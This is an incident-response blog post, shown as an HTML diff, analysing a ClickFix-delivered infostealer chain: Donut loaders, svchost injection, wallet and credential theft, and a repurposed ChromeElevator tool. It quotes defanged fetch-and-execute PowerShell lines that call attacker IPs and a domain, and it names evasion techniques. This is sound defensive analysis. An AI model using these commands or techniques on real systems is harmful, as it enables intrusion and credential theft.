@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="author" content="Josh Kiriakoff" />
+  <meta name="theme-color" content="#1b1c25" />
+  <title>Let's ClickFix some errors · josh.kiriakoff</title>
+  <meta name="description" content="Walking a Donut + ChromeElevator infostealer chain that started with a single Run-dialog paste. RunMRU, svchost injection, and an open payload directory." />
+  <link rel="canonical" href="https://josh-kiriakoff.github.io/blog/clickfix-donut-chain/" />
+
+  <!-- OpenGraph -->
+  <meta property="og:type" content="article" />
+  <meta property="og:site_name" content="josh.kiriakoff" />
+  <meta property="og:title" content="Let's ClickFix some errors" />
+  <meta property="og:description" content="Walking a Donut + ChromeElevator infostealer chain that started with a single Run-dialog paste." />
+  <meta property="og:url" content="https://josh-kiriakoff.github.io/blog/clickfix-donut-chain/" />
+  <meta property="og:image" content="https://josh-kiriakoff.github.io/img/favicon.svg" />
+  <meta property="article:author" content="Josh Kiriakoff" />
+  <meta property="article:published_time" content="2026-05-26" />
+  <meta property="article:section" content="blog" />
+
+  <!-- Twitter -->
+  <meta name="twitter:card" content="summary" />
+  <meta name="twitter:title" content="Let's ClickFix some errors" />
+  <meta name="twitter:description" content="Walking a Donut + ChromeElevator infostealer chain that started with a single Run-dialog paste." />
+  <meta name="twitter:image" content="https://josh-kiriakoff.github.io/img/favicon.svg" />
+
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg" />
+  <link rel="stylesheet" href="../../css/style.css" />
+
+  <!-- Feeds -->
+  <link rel="alternate" type="application/atom+xml" title="josh.kiriakoff — blog" href="../../feed-blog.xml" />
+  <link rel="alternate" type="application/atom+xml" title="josh.kiriakoff — detections" href="../../feed-detections.xml" />
+</head>
+<body>
+
+  <a href="#main" class="skip-link">skip to content</a>
+
+  <div class="window">
+
+    <header class="chrome">
+      <div class="lights" aria-hidden="true">
+        <span class="l-close"></span>
+        <span class="l-min"></span>
+        <span class="l-max"></span>
+      </div>
+      <div class="chrome-title">josh@kiriakoff:~/blog/lets-clickfix-some-errors.md</div>
+    </header>
+
+    <nav class="tabs" aria-label="primary">
+      <a href="../../">josh.kiriakoff</a>
+      <a href="../../about/">about</a>
+      <a href="../" class="active">blog</a>
+      <a href="../../detections/">detections</a>
+      <a href="../../admin/" class="right">admin</a>
+    </nav>
+
+    <div class="body" id="main">
+      <section class="shell" id="shell" aria-label="terminal session">
+
+        <div class="block" id="b-1" data-cmd="cat " data-target="./lets-clickfix-some-errors.md" data-after="b-2">
+          <div class="line">
+            <span class="ps1"><span class="user">josh</span><span class="sep">@</span><span class="user">kiriakoff</span><span class="sep">:</span><span class="dir">~/blog</span><span class="sep">$</span></span><span class="cmd">cat </span><span class="target">./lets-clickfix-some-errors.md</span>
+          </div>
+
+          <div class="output article-body" hidden>
+
+            <h1>Let's ClickFix some errors</h1>
+
+            <h2>Background</h2>
+            <p>
+              Most signals I triage at Huntress trace back to a file. Someone opened an attachment, clicked a link, ran an installer they shouldn't have. The artifact lands on disk, the agent sees it, I pull it apart.
+            </p>
+            <p>
+              This one was different. There was no file. There was no attachment. The user had pressed Windows + R, pasted a command they'd been told to paste, and pressed Enter. From the operating system's perspective, this was a legitimate user typing into a legitimate dialog box. From my perspective, it was the start of a chain that walked from a 50-byte PowerShell one-liner all the way through to a publicly available cookie decryption tool repurposed by the attacker for credential theft at scale.
+            </p>
+
+            <h2>The first signal</h2>
+            <p>
+              The Huntress agent registered a high-severity PowerShell detection on a workstation belonging to a user I'll call <code>[User 1]</code>. The command line told me almost everything I needed to know before I'd pulled a single artifact:
+            </p>
+            <pre><code>"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" -c iex(irm 158[.]94[.]209[.]33 -UseBasicParsing)</code></pre>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig01-edr-alert.png" alt="Huntress alert showing high-severity PowerShell rule firing at 2026-03-21 11:46:26 UTC with the iex+irm command line visible." loading="lazy" />
+              <figcaption>Figure 1: Huntress alert, PowerShell rule, high severity. Command line: <code>iex(irm 158[.]94[.]209[.]33 -UseBasicParsing)</code>.</figcaption>
+            </figure>
+
+            <p>
+              Two components matter here. <code>irm</code> is Invoke-RestMethod, which reaches out to a remote server and pulls down whatever text the server returns. <code>iex</code> is Invoke-Expression, which takes that text and runs it as live PowerShell code in the memory of the calling process. No file is ever written to disk. The payload arrives as a string and runs instantly.
+            </p>
+            <p>
+              The detection timeline showed the process chain Windows recorded: <code>winlogon.exe</code> to <code>userinit.exe</code> to <code>Explorer.EXE</code> to <code>PowerShell.exe</code>. The PowerShell process started at 2026-03-21 11:41:47 UTC. That timestamp became my anchor for the rest of the investigation.
+            </p>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig02-process-tree.png" alt="Detection timeline showing winlogon.exe to userinit.exe to Explorer.EXE to PowerShell.exe chain, with process details panel showing Started At 2026-03-21 11:41:47 UTC and the malicious command line." loading="lazy" />
+              <figcaption>Figure 2: Process tree from the detection timeline. The PowerShell process is a direct child of <code>Explorer.EXE</code>, the signature of a user-initiated command rather than a browser or Office child.</figcaption>
+            </figure>
+
+            <p>
+              The <code>Explorer.EXE</code> parent is doing a lot of work for me. Browser-initiated PowerShell would have an <code>iexplore.exe</code> or <code>chrome.exe</code> parent. Office-macro PowerShell would have <code>winword.exe</code> or <code>excel.exe</code>. A scheduled task would have <code>svchost.exe</code>. The usual legitimate ways for PowerShell to be parented by <code>explorer.exe</code> are a shortcut, a Start Menu search, or the Run dialog. I needed to confirm which.
+            </p>
+
+            <h2>RunMRU, or who actually typed it?</h2>
+            <p>
+              The Windows Run dialog records every command a user enters into it. The data lives in the registry under <code>HKU\&lt;SID&gt;\SOFTWARE\Microsoft\Windows\CurrentVersion\Explorer\RunMRU</code>, with one value per recent entry and an <code>MRUList</code> value that orders them. Nine times out of ten, this is the first place I look when PowerShell shows up as a child of <code>explorer.exe</code>.
+            </p>
+            <p>
+              I pulled the key.
+            </p>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig03-runmru.png" alt="Huntress agent RunMRU registry value listing showing key value 'a' containing the literal pasted PowerShell command, plus the MRUList value." loading="lazy" />
+              <figcaption>Figure 3: RunMRU registry contents for the user's profile. The value named <code>a</code> holds the literal command pasted into the Run dialog: <code>powershell -c iex(irm 158[.]94[.]209[.]33 -UseBasicParsing)\1</code>.</figcaption>
+            </figure>
+
+            <p>
+              This was not an exploit. This was not an attached document. The user had pressed Windows + R, pasted the command into the box, and pressed Enter. The most likely upstream vector is a phishing page or fake CAPTCHA telling the user to "verify themselves" by running a command they could copy and paste. The technique is sometimes called ClickFix or FileFix, and the reason attackers reach for it is simple: it bypasses everything. There is no file for an AV scanner to inspect, no attachment for an email gateway to detonate, no exploit for a vulnerability scanner to flag. The delivery mechanism is the user's willingness to follow direction.
+            </p>
+
+            <h2>Stage 1: a hidden child and a new IP</h2>
+            <p>
+              With the initial vector confirmed, I pulled the content that <code>158[.]94[.]209[.]33</code> was serving. A simple <code>wget</code> against the IP returned a roughly 20-line PowerShell script.
+            </p>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig04-stage1-script.png" alt="VS Code view of stage1.txt showing PowerShell that wraps Invoke-WebRequest to 178[.]16[.]53[.]70 inside a ProcessStartInfo block that spawns a brand-new hidden powershell.exe child process." loading="lazy" />
+              <figcaption>Figure 4: Stage 1 (<code>stage1.txt</code>). The script wraps a second <code>Invoke-WebRequest</code> to a different IP inside a <code>ProcessStartInfo</code> block that spawns a hidden PowerShell process to run it.</figcaption>
+            </figure>
+
+            <p>
+              Three details from Stage 1 are worth pointing at directly.
+            </p>
+            <p>
+              First, the target IP has changed. The initial Run-dialog command pointed at <code>158[.]94[.]209[.]33</code>. Stage 1 reaches out to <code>178[.]16[.]53[.]70</code>. The attacker has separated their script delivery from their next-stage hosting, so blocking one server does not stop the chain.
+            </p>
+            <p>
+              Second, both stages talk to raw IP addresses rather than domains. This is a recurring choice in this campaign. Raw IPs leave no trace in DNS logs, do not appear in domain-based threat intelligence feeds, and cannot be sinkholed by registering a domain. They also do not require the attacker to renew anything.
+            </p>
+            <p>
+              Third, and most operationally interesting, Stage 1 does not invoke the next stage in its own process. It uses <code>System.Diagnostics.ProcessStartInfo</code> to spawn a brand-new <code>powershell.exe</code> with <code>WindowStyle</code> set to <code>Hidden</code> and <code>CreateNoWindow</code> set to true. That new process runs the next stage. Security tools track parent-child relationships to reconstruct what happened during an incident. By detaching the rest of the chain into a fresh process at Stage 1, the attacker leaves any tool that wasn't observing in real time with no in-memory chain back to the original <code>explorer.exe</code>-parented PowerShell that started everything.
+            </p>
+
+            <h2>Stage 2: C#, RWX memory, and a familiar protection flag</h2>
+            <p>
+              A <code>wget</code> against <code>178[.]16[.]53[.]70</code> returned Stage 2, also as plain text.
+            </p>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig05-stage2-script.png" alt="VS Code view of stage2.txt showing inline C# class with kernel32 imports for VirtualAlloc, GetCurrentProcess, CreateThread, WaitForSingleObject, loaded via Add-Type, then VirtualAlloc called with PAGE_EXECUTE_READWRITE protection." loading="lazy" />
+              <figcaption>Figure 5: Stage 2 (<code>stage2.txt</code>). The script fetches a binary from <code>hxxp://178[.]16[.]52[.]201/9cca20c6df659f72/m_cpt2003.bin</code>, then uses an inline C# class via <code>Add-Type</code> to allocate memory with <code>VirtualAlloc</code> and run the binary on a new thread.</figcaption>
+            </figure>
+
+            <p>
+              This is where the chain stops looking like a script and starts looking like real shellcode loading. PowerShell does not natively have a way to allocate memory with arbitrary protection flags. To get around that, the attacker embedded a small C# class inside the PowerShell script and used <code>Add-Type -TypeDefinition</code> to compile it on the fly. The class imports four <code>kernel32</code> functions: <code>VirtualAlloc</code>, <code>GetCurrentProcess</code>, <code>CreateThread</code>, and <code>WaitForSingleObject</code>.
+            </p>
+            <p>
+              The memory protection flag deserves its own paragraph. <code>VirtualAlloc</code> is called with the protection constant <code>0x40</code>, which is <code>PAGE_EXECUTE_READWRITE</code>. That is a block of memory the process can read, write to, and execute, all simultaneously. Legitimate software almost never asks for this combination because mixing writable and executable memory is dangerous by design. Modern endpoint security tools watch for exactly this flag in exactly this position, because it is one of the strongest single indicators that shellcode is about to be loaded. The attacker chose it anyway. They needed to copy a downloaded binary into a region and then jump into it as code, and there is no cleaner way to do that with a PowerShell-hosted loader.
+            </p>
+            <p>
+              A new IP also appears in Stage 2: <code>178[.]16[.]52[.]201</code>. That makes three servers now, each handling a different tier of the operation.
+            </p>
+
+            <h2>Stage 3: Donut, SeDebugPrivilege, and the svchost question</h2>
+            <p>
+              The file at <code>hxxp://178[.]16[.]52[.]201/9cca20c6df659f72/m_cpt2003.bin</code> is a 51 KB blob. Opening it in <a href="https://github.com/horsicq/DIE-engine" target="_blank" rel="noopener noreferrer">Detect It Easy</a> shows the kind of profile you only get from one thing.
+            </p>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig06-stage3-entropy.png" alt="Detect It Easy entropy view of Stage 3 m_cpt2003.bin showing overall entropy 7.531, 94% packed, with the entropy line sitting flat near the maximum across the file body." loading="lazy" />
+              <figcaption>Figure 6: Detect It Easy entropy view of Stage 3 (<code>m_cpt2003.bin</code>), showing overall entropy 7.531 and a 94% packed classification. VirusTotal flagged the file 21/72, with labels clustering on <code>Trojan.Donut.Marte</code>.</figcaption>
+            </figure>
+
+            <p>
+              <a href="https://github.com/TheWover/donut" target="_blank" rel="noopener noreferrer">Donut</a> is a publicly available offensive framework written by The Wover. It takes a standard PE file, wraps it in a layer of encryption with a small decryption stub at the front, and produces a single position-independent shellcode blob. The result executes correctly regardless of where in memory it lands, which is exactly what the Stage 2 <code>VirtualAlloc + CreateThread</code> pattern needs.
+            </p>
+            <p>
+              The encryption is the problem for static analysis. Inside the Donut wrapper, the original executable is unreadable. To get past it without executing the shellcode in a sandbox, I used <a href="https://github.com/volexity/donut-decryptor" target="_blank" rel="noopener noreferrer">Donut Decryptor</a> by Volexity, which understands Donut's internal format, locates the embedded encryption key, and performs the decryption offline.
+            </p>
+            <p>
+              With the binary unwrapped, the strings told me what Stage 3 was for.
+            </p>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig07-stage3-strings.png" alt="String dump of decrypted Stage 3 in Detect It Easy showing SeDebugPrivilege, svchost.exe, and a URL containing 178[.]16[.]52[.]201/9cca20c6df659f72/." loading="lazy" />
+              <figcaption>Figure 7: String dump of decrypted Stage 3. Visible: <code>SeDebugPrivilege</code>, <code>svchost.exe</code>, and the next-stage URL <code>hxxp://178[.]16[.]52[.]201/9cca20c6df659f72/m_cpt_bld172638.bin</code>.</figcaption>
+            </figure>
+
+            <p>
+              <code>SeDebugPrivilege</code> is the Windows privilege required to open and manipulate processes belonging to other security contexts, including SYSTEM-owned processes. The malware enables it on its own access token before doing anything else. Without it, the process injection that follows is blocked at the kernel level.
+            </p>
+            <p>
+              From there, Stage 3 does three things in sequence. It uses standard <code>WinHTTP</code> functions to fetch the next payload from the same <code>178[.]16[.]52[.]201</code> directory. It walks the system process list looking specifically for <code>svchost.exe</code>. And it injects the downloaded blob into the first matching <code>svchost</code> it finds, using <code>VirtualAllocEx</code>, <code>WriteProcessMemory</code>, and <code>CreateRemoteThread</code>.
+            </p>
+            <p>
+              <code>svchost.exe</code> is a deliberate choice. A normal Windows machine has between ten and twenty instances of it running at any given time. It is a trusted Microsoft-signed binary, it is expected to maintain network connections, and it is a process most EDR tools will not alert on by default for outbound connections. By the time Stage 4 starts running, the attacker's code is executing from inside a process that looks like the operating system.
+            </p>
+
+            <h2>Stage 4: eighty wallets, a hardcoded key, and a forgotten installer</h2>
+            <p>
+              The Stage 4 binary is another Donut-wrapped payload, fetched by Stage 3 directly into <code>svchost</code>'s allocated memory. I pulled a fresh copy from the payload server and ran the same decryption pass. The decrypted module is a 64-bit PE GUI application with 167 KB of executable code and a section reserving 6.4 MB of uninitialised memory. That reserved buffer is the giveaway. Stage 4 is built to collect at scale, with room to stage browser databases, wallet files, a screen capture, and a per-host system-inventory record in memory before encrypting and sending it out.
+            </p>
+            <p>
+              The strings inside Stage 4 made the targeting concrete.
+            </p>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig08-stage4-strings.png" alt="String dump of decrypted Stage 4 showing wallet extension IDs, exfiltration IP 158[.]94[.]210[.]166, MSI download URL 178[.]16[.]52[.]201/9cca20c6df659f72/t_installer.msi, chromelevator.bin URL, and msiexec /qn install template." loading="lazy" />
+              <figcaption>Figure 8: String dump of decrypted Stage 4. Visible: the exfiltration IP <code>158[.]94[.]210[.]166</code>, the MSI and ChromeElevator download URLs, the <code>msiexec.exe /i "%s" /qn</code> template, and the <code>%s\sysinfo</code> and <code>%s\chromelevator output</code> path markers.</figcaption>
+            </figure>
+
+            <p>
+              Stage 4 was hunting through the victim's <code>AppData</code> for:
+            </p>
+            <table>
+              <thead>
+                <tr><th>Category</th><th>Items targeted</th></tr>
+              </thead>
+              <tbody>
+                <tr><td>Cryptocurrency wallets</td><td>80+ browser-extension wallets, including MetaMask, Phantom, Coinbase, OKX, Trust Wallet, TokenPocket, BackpackWallet, OpenMaskWallet, MewCX</td></tr>
+                <tr><td>Password managers</td><td>14 browser-extension password managers</td></tr>
+                <tr><td>Messaging</td><td>Telegram Desktop session data</td></tr>
+                <tr><td>File transfer</td><td>FileZilla saved credentials</td></tr>
+                <tr><td>Remote access</td><td>OpenVPN connection profiles</td></tr>
+                <tr><td>Browsers (profile sources for the cookie stealer)</td><td>Chromium-family (Chrome, Edge, Brave, Opera), Gecko-family (Firefox, Waterfox, LibreWolf, Pale Moon)</td></tr>
+                <tr><td>Host snapshot</td><td>Screen capture written to a <code>Screenshot.jpg</code> path with an <code>image/jpeg</code> MIME marker</td></tr>
+                <tr><td>System inventory</td><td>Per-host <code>sysinfo</code> record (single-instance mutex <code>Global\sysinfo</code>, on-disk path templated with a date-and-time format string)</td></tr>
+              </tbody>
+            </table>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig09-stage4-screenshot-strings.webp" alt="Second strings view of decrypted Stage 4 showing a Screenshot.jpg path constant and an image/jpeg MIME string alongside browser and wallet path constants." loading="lazy" />
+              <figcaption>Figure 9: A second strings region of Stage 4. Visible: a <code>Screenshot.jpg</code> filename and an <code>image/jpeg</code> MIME string alongside more wallet and browser path constants, confirming a screenshot is produced during collection.</figcaption>
+            </figure>
+
+            <p>
+              Collected data is encrypted with AES-256 before transmission. The attacker made a mistake here that is worth pointing at: the encryption key is hardcoded directly into the binary. Because I extracted it during static analysis, any captured exfiltration traffic from this campaign can be decrypted offline by an incident responder. The string that sits next to the key in Stage 4's data section reads <code>sysinfo aes256 channel key 2024!!</code>. The label is informative on its own. The key is the AES-256 channel key used for sysinfo exfiltration, and the trailing <code>2024!!</code> is a campaign-year tag that suggests this same key has been carried across builds for at least a year before the March 2026 incident.
+            </p>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig10-aes-key-string.webp" alt="Detect It Easy strings view of decrypted Stage 4 showing the label sysinfo aes256 channel key 2024!! at offset 0x0002e5cf alongside other Stage 4 data-section strings." loading="lazy" />
+              <figcaption>Figure 10: Detect It Easy strings view of decrypted Stage 4 with the AES key label highlighted. The string at offset <code>0x0002e5cf</code> reads <code>sysinfo aes256 channel key 2024!!</code>.</figcaption>
+            </figure>
+            <p>
+              Exfiltration itself does not use HTTP. Stage 4 calls into <code>ws2_32.dll</code> and opens raw TCP sockets to <code>158[.]94[.]210[.]166</code>. This is a deliberate choice that bypasses web proxies and HTTP content inspection. A SOC that only inspects ports 80 and 443 with TLS termination will see nothing from this payload.
+            </p>
+            <p>
+              One of the more useful lines in the string dump was the additional download URL list. Stage 4 doesn't just exfiltrate. It also fetches two further payloads from the same <code>178[.]16[.]52[.]201</code> directory: an MSI installer and a Chrome-related binary (<code>chromelevator.bin</code>). A quick note on the MSI's naming, because both labels appear from here onward. On the payload server, the file is hosted as <code>t_installer.msi</code>, which is the name visible in Figure 8 above and in the directory listing later. In my logs and the binary's static-analysis output, the same file shows up under the shorter name <code>install.msi</code>. They are the same artifact, just labelled differently in each context. The MSI is fetched, written to <code>%LOCALAPPDATA%\Temp\~vrf&lt;GetTickCount&gt;.msi</code>, and executed silently with <code>msiexec.exe /i "..." /qn</code>. This is the first point in the chain where a payload gets written to disk.
+            </p>
+
+            <h2>Two directions to chase</h2>
+            <p>
+              When I attempted to download the remaining files directly from the attacker's server, the results were mixed. The Chrome binary came down without resistance, which confirmed the server was still serving traffic. The installer, however, returned a file-not-found on direct requests. My first read on that was that the operator had pulled the file as a single-use download keyed to a victim identifier I did not have. The actual cause, as I'll show a few paragraphs below, turned out to be something simpler.
+            </p>
+            <p>
+              Either way, that gave me two directions to chase. I needed to determine whether the installer had actually executed on the victim's machine before I lost access to the file, and I needed to examine what the Chrome binary did on its own. To keep the timeline in order, I followed the installer first.
+            </p>
+            <p>
+              This is where I moved into timeline correlation, and in a real SOC environment it takes up a significant amount of time. Logs rarely sit in one place. They come from EDR platforms, endpoint telemetry, network monitoring, SIEM systems, and more.
+            </p>
+
+            <h2>Following the installer</h2>
+            <p>
+              I confirmed the install actually ran by going back to the EDR telemetry. The anchor timestamp was 11:41:47 UTC. I pivoted to host process events in Elastic and searched for <code>msiexec.exe</code>.
+            </p>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig11-elastic-msiexec.png" alt="Elastic Discover view filtered for msiexec.exe process events on the affected host showing a row matched at 2026-03-21 11:41:58.265 UTC with command line msiexec.exe /i pointing to a ~vrf.msi file in Local Temp." loading="lazy" />
+              <figcaption>Figure 11: Elastic Discover view of <code>msiexec.exe</code> process events on the affected host. A silent install fired at 2026-03-21 11:41:58.265 UTC, eleven seconds after the initial PowerShell execution, with command line <code>msiexec.exe /i "C:\Users\[REDACTED]\AppData\Local\Temp\~vrf262689062.msi" /qn</code>.</figcaption>
+            </figure>
+
+            <p>
+              The 11-second gap is informative. It suggests the stealer ran, completed its initial collection pass, fetched the MSI, executed it, and finished, all in the span of a brief pause. By the time the user could have noticed anything off about their machine, the install was already done.
+            </p>
+            <p>
+              The EDR data answered the first question. The installer ran. But to answer what it actually did, I still needed the file itself, and the host was offline so live forensic collection was off the table. The direct fetch I had attempted earlier had returned a file-not-found, which I had read as a pulled single-use download.
+            </p>
+            <p>
+              I went back to it and looked more carefully. When I navigated to the URL in a standard browser, the server returned a Cloudflare-style "not found" page. The attacker had configured the payload server to filter requests based on the <code>User-Agent</code> header, and a normal browser request did not match what the malware sends. The single-use interpretation was wrong. The file was still there, the server just would not hand it over unless the request looked like it came from a victim.
+            </p>
+            <p>
+              The workaround was small. In Chrome's DevTools, under Network conditions, I overrode the User-Agent to a generic <code>Mozilla/5.0 (Windows NT 10.0; Win64; x64) PowerShell/7.4.1</code> string and reloaded the page.
+            </p>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig12-directory-listing.png" alt="Open directory listing at 178[.]16[.]52[.]201/9cca20c6df659f72/ showing chromelevator.bin, dl_cpt2003.bin, t_installer.msi, tutel_cpt2003.bin, and t_cpt2003.bin with file sizes and timestamps. DevTools Network conditions panel shows the custom PowerShell User-Agent override." loading="lazy" />
+              <figcaption>Figure 12: The directory listing returned once the User-Agent was set to a PowerShell-shaped value, with directory indexing left enabled on <code>178[.]16[.]52[.]201/9cca20c6df659f72/</code>. Visible files include <code>chromelevator.bin</code> (1.4 MB), <code>dl_cpt2003.bin</code> (32 KB), <code>t_installer.msi</code> (36 KB), and several other Donut-wrapped variants.</figcaption>
+            </figure>
+
+            <p>
+              This was the operational-security failure of the campaign. One header check that the attacker had bothered to put in place, and a single misconfiguration that gave me full visibility into their entire payload set with no other authentication required. I pulled a copy of every file in the directory.
+            </p>
+
+            <h2>The reinfection mechanism</h2>
+            <p>
+              With the MSI recovered, I opened it in <a href="https://github.com/activescott/lessmsi" target="_blank" rel="noopener noreferrer"><code>lessmsi</code></a>, which reads the installer's internal tables without executing any custom actions.
+            </p>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig13-msi-custom-action.png" alt="lessmsi view of the install.msi CustomAction table with a PowerShell action that generates an 8-character random victim ID and calls iex on hxxps://sctlogin[.]click/captcha.php." loading="lazy" />
+              <figcaption>Figure 13: <code>lessmsi</code> view of the MSI's <code>CustomAction</code> table. The PowerShell <code>Execute</code> row generates a random victim ID, then runs <code>iex (New-Object Net.WebClient).DownloadString('hxxps://sctlogin[.]click/captcha.php')</code> against a domain not seen earlier in the chain.</figcaption>
+            </figure>
+
+            <p>
+              <code>sctlogin[.]click</code> was a domain I hadn't seen before. Passive DNS and registration lookups showed it had been registered about a month before the campaign launched, with 7/94 vendors already flagging it as malicious, under a "Spam" classification. Pivoting on the domain surfaced multiple installer files contacting it, including the <code>install.msi</code> sample I recovered and a separate <code>~vrf250503.msi</code> from a later campaign run. The domain also resolves on <code>www.sctlogin[.]click</code> and exposes a <code>banking.sctlogin[.]click</code> subdomain, which together suggest the same infrastructure is being reused for credential-harvesting pages elsewhere.
+            </p>
+            <p>
+              When I tried to fetch the payload that <code>sctlogin[.]click/captcha.php</code> was serving, the request failed. The domain no longer resolves at the time of analysis. The attacker had either taken it down or moved on. I could not retrieve the response, but the call itself is enough on its own: the MSI's custom action runs <code>iex</code> on whatever <code>captcha.php</code> returns, so any PowerShell that endpoint serves executes automatically as part of the install, no user interaction. The endpoint name matches the ClickFix branding upstream, which makes a follow-on stage of the same chain the most likely content, but I cannot confirm exactly what was being served at the time of compromise. Either way, the MSI is wired as a remote-PowerShell trigger that fires every install, which is what makes it a reinfection mechanism.
+            </p>
+
+            <h2>ChromeElevator: when attackers borrow from the security community</h2>
+            <p>
+              The other file fetched by Stage 4, <code>chromelevator.bin</code>, is a 1.4 MB binary that turned out to be a completely separate compilation lineage from the Donut chain. VirusTotal flagged it 53/72, with most labels in the <code>Trojan.Loader.Donut</code> / <code>ShellcodeLoader</code> cluster despite the binary not being Donut-wrapped at all. The detection rate was unusually high for a freshly built sample, which suggested the underlying source had been seen in many campaigns already.
+            </p>
+            <p>
+              Whereas Stage 3 and Stage 4 appear to have been built with a non-Microsoft toolchain and wrapped with Donut, ChromeElevator was built with Microsoft Visual C++ in Visual Studio 2022. The toolchain mismatch suggests the attacker did not write this themselves and was instead reusing a tool built somewhere else.
+            </p>
+            <p>
+              I pulled the binary into Detect It Easy and looked at its strings. The ASCII art at the top of the dump named the tool outright: a <code>ChromeElevator</code> banner, the subtitle "Direct Syscall-Based Reflective Hollowing", a version line reading <code>v0.18.0 by @xaitax</code>, and the full usage text the binary prints on launch. The author handle was the lead I needed.
+            </p>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig14-die-strings.png" alt="Detect It Easy strings view of chromelevator.bin showing the ChromeElevator ASCII banner, the 'Direct Syscall-Based Reflective Hollowing' subtitle, the 'v0.18.0 @xaitax' version string, and the binary's runtime usage text." loading="lazy" />
+              <figcaption>Figure 14: Detect It Easy strings view of <code>chromelevator.bin</code>, showing the ASCII banner, the <code>Direct Syscall-Based Reflective Hollowing</code> subtitle, and the <code>v0.18.0 @xaitax</code> version line. The author handle and tool name fell out of static strings, no execution required.</figcaption>
+            </figure>
+
+            <p>
+              The handle <a href="https://github.com/xaitax" target="_blank" rel="noopener noreferrer"><code>@xaitax</code></a> leads directly to a public GitHub profile belonging to Alexander Hagenah, a security researcher who publishes a number of Windows security and offensive-research tools. His repository <a href="https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption" target="_blank" rel="noopener noreferrer"><code>Chrome-App-Bound-Encryption-Decryption</code></a> matches the binary's filename, behaviour, and banner exactly. The tool is a published proof-of-concept for defeating Google's App-Bound Encryption mechanism, intended for defensive research and credential-recovery work.
+            </p>
+
+            <figure>
+              <img src="../../img/clickfix-donut-chain/fig15-chromelevator-github.png" alt="ChromeElevator console output from the public GitHub repository documentation, showing the ASCII banner, the 'Direct Syscall-Based Reflective Hollowing' subtitle, the v0.18.0 by @xaitax version line, the runtime decryption key, and harvest results: 1,312 cookies, 792 passwords, 1 card, 1 IBAN, 2 tokens across two profiles." loading="lazy" />
+              <figcaption>Figure 15: Reference output from the public <code>Chrome-App-Bound-Encryption-Decryption</code> repository, whose banner and version string match the strings recovered from <code>chromelevator.bin</code>. The documented run against two profiles harvests 1,312 cookies, 792 passwords, 1 card, 1 IBAN, and 2 authentication tokens.</figcaption>
+            </figure>
+            <p>
+              Attackers regularly recompile open-source security research tools and drop them into their campaigns. It saves them the engineering effort of building their own reflective loaders and bypass code, and it puts them on the same footing as the defenders studying the same techniques. The fact that this campaign reaches for <code>Chrome-App-Bound-Encryption-Decryption</code> suggests the operator understood the specific gap that App-Bound Encryption created for traditional infostealers, and went looking for the published fix.
+            </p>
+            <p>
+              This is the piece that makes the whole campaign work against modern Chrome. Stage 4, sitting inside <code>svchost</code>, has no problem copying Chrome's cookie and credential databases off disk. The databases themselves are encrypted, though, and the keys that decrypt them are tied to Chrome's own process identity by a feature called App-Bound Encryption. Anything that is not Chrome gets refused. ChromeElevator's answer to that is to be Chrome, in the way that matters to the operating system.
+            </p>
+            <p>
+              The technique the banner names is direct syscall-based reflective hollowing. Two ideas, and both of them matter.
+            </p>
+            <p>
+              Direct syscalls is the EDR-evasion half. When normal Windows code talks to the kernel, it goes through <code>ntdll.dll</code>, the standard library Windows provides for the job. Most EDR tools install their detection hooks inside <code>ntdll</code>, watching every call that passes through for suspicious patterns like a thread being injected into another process. Direct syscalls skip <code>ntdll</code> entirely. The tool calls the kernel by its raw syscall numbers, the same way <code>ntdll</code> itself does. The EDR's hook sees nothing, because the call never crossed it.
+            </p>
+            <p>
+              Reflective hollowing is the impersonation half. The tool launches a fresh <code>chrome.exe</code> in a suspended state, rewrites the new process's memory with attacker code, then lets it run. From the operating system's point of view, the process on the system is genuine Chrome by every observable check: name, path, parent process, code signature on disk. From the attacker's point of view, Chrome is now executing the attacker's payload, and the operating system is treating every API call the payload makes as Chrome's own.
+            </p>
+            <p>
+              Put the two together and App-Bound Encryption is no longer a barrier. The decryption code, running inside the hollowed Chrome, can ask the operating system for the runtime keys, and the operating system answers, because as far as it can tell the asker really is Chrome. The cookie and credential databases that Stage 4 copied off disk become readable.
+            </p>
+            <p>
+              The <code>%s\chromelevator output</code> path constant visible in Stage 4's strings (Figure 8) is the join: Stage 4 references ChromeElevator's output directory via a templated path, which lines the decrypted material up with the same exfiltration channel Stage 4 already uses for everything else it collects.
+            </p>
+
+            <h2>Conclusion</h2>
+            <p>
+              Most of the techniques in this chain have been documented for years. Donut-wrapped loaders, <code>svchost</code> injection, AES-256 with a hardcoded key, and a published research tool dropped into an attacker's toolkit are all familiar pieces. The delivery is what makes the campaign work.
+            </p>
+            <p>
+              There was no file, no attachment, and no exploit. The user was the delivery mechanism, and every file-centric, email-centric, and vulnerability-centric control in a typical security stack saw nothing. The only control that fired was the one watching what <code>powershell.exe</code> did the moment it spawned from <code>explorer.exe</code>. If that control wasn't there, the next signal in the chain would have been an exfiltration alert from a network sensor, days later, by which point the credentials, the wallets, and the session cookies would already be sold.
+            </p>
+            <p>
+              ClickFix-shaped social engineering is going to keep working until users stop being asked to paste verification commands. That isn't a battle defenders are going to win at the user-training tier. The detections that matter are the ones that fire on the shape of the execution, not on the file that delivered it.
+            </p>
+
+            <h2>Indicators of compromise</h2>
+
+            <h3>Network indicators</h3>
+            <table class="iocs-short">
+              <thead>
+                <tr><th>Item</th><th>Description</th></tr>
+              </thead>
+              <tbody>
